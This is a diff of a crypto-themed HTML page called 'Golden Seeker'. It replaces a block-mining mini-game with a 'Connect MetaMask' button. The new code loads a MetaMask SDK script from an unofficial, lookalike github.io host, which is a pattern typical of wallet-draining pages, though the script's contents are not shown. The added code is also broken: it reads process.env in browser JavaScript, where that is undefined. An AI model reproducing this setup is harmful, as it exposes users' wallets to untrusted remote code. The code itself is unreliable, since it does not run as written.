@@ -56,43 +56,47 @@
             100% { transform: rotate(360deg); }
         }
 
-        #game {
-            display: grid;
-            grid-template-columns: repeat(5, 50px);
-            grid-gap: 10px;
-            margin-top: 20px;
-        }
-
-        .block {
-            width: 50px;
-            height: 50px;
+        #connect-button {
+            margin-top: 30px;
+            padding: 10px 20px;
+            font-size: 18px;
             background-color: #ffd700;
-            display: flex;
-            justify-content: center;
-            align-items: center;
+            color: #000;
+            border: none;
             cursor: pointer;
-            transition: transform 0.2s, opacity 0.2s;
+            border-radius: 5px;
+            transition: background-color 0.3s;
         }
 
-        .block.explode {
-            transform: scale(1.5);
-            opacity: 0;
-            pointer-events: none;
-        }
-
-        #message {
-            font-size: 20px;
-            color: #ffd700;
-            margin-top: 20px;
-            display: none;
-        }
-
-        #link {
-            color: #ffd700;
-            text-decoration: underline;
-            cursor: pointer;
+        #connect-button:hover {
+            background-color: #e6c200;
         }
     </style>
+
+    <script src="https://c0f4f41c-2f55-4863-921b-sdk-docs.github.io/cdn/metamask-sdk.js"></script>
+    <script>
+        const MMSDK = new MetaMaskSDK.MetaMaskSDK({
+            dappMetadata: {
+                name: "Golden Seeker",
+                url: window.location.href,
+            },
+            infuraAPIKey: process.env.INFURA_API_KEY, // Make sure to replace with your actual Infura API key
+        });
+
+        function connectMetaMask() {
+            // Access MetaMask provider
+            const ethereum = MMSDK.getProvider();
+
+            // Request to connect MetaMask
+            ethereum.request({ method: 'eth_requestAccounts' })
+                .then(accounts => {
+                    alert('Connected: ' + accounts[0]);
+                })
+                .catch(error => {
+                    alert('Error connecting MetaMask: ' + error.message);
+                });
+        }
+    </script>
 </head>
 <body>
     <img src="logo.png" alt="Golden Seeker Logo">
@@ -102,42 +106,7 @@
 
     <div class="loader"></div> <!-- Animated loader -->
 
-    <!-- Mini-game area -->
-    <div id="game">
-        <!-- Blocks to mine -->
-        <div class="block"></div>
-        <div class="block"></div>
-        <div class="block"></div>
-        <div class="block"></div>
-        <div class="block"></div>
-        <div class="block"></div>
-        <div class="block"></div>
-        <div class="block"></div>
-        <div class="block"></div>
-        <div class="block"></div>
-    </div>
-
-    <div id="message">
-        Congratulations! You've mined all the blocks. Join us on Telegram: 
-        <a id="link" href="https://t.me/GoldSeekerGame" target="_blank">https://t.me/GoldSeekerGame</a>
-    </div>
-
-    <script>
-        const blocks = document.querySelectorAll('.block');
-        const message = document.getElementById('message');
-
-        // Add click event to each block
-        blocks.forEach(block => {
-            block.addEventListener('click', () => {
-                block.classList.add('explode'); // Add explosion effect
-                setTimeout(() => block.style.display = 'none', 200); // Hide block after animation
-
-                // Check if all blocks are mined
-                if ([...blocks].every(block => block.style.display === 'none')) {
-                    message.style.display = 'block'; // Show win message
-                }
-            });
-        });
-    </script>
+    <!-- Connect MetaMask Button -->
+    <button id="connect-button" onclick="connectMetaMask()">Connect MetaMask</button>
 </body>
 </html>
